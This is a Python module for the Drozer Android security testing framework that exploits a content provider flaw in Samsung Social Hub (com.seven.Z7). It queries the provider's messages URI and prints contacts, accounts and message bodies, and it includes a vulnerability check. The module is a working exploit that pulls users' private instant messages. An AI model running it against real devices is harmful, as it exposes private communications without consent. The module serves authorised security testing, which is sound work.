from mwr.droidhg.modules import common, Module

class InstantMessages(Module, common.Provider, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.seven.Z7."
    description = "Tests for Content Provider vulnerability in com.seven.Z7."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "oem", "samsung", "social_hub"]

    label = "Instant messages from Social Hub (com.seven.Z7)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://com.seven.provider.im/messages", projection=["_id", "contact", "account", "body"])

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
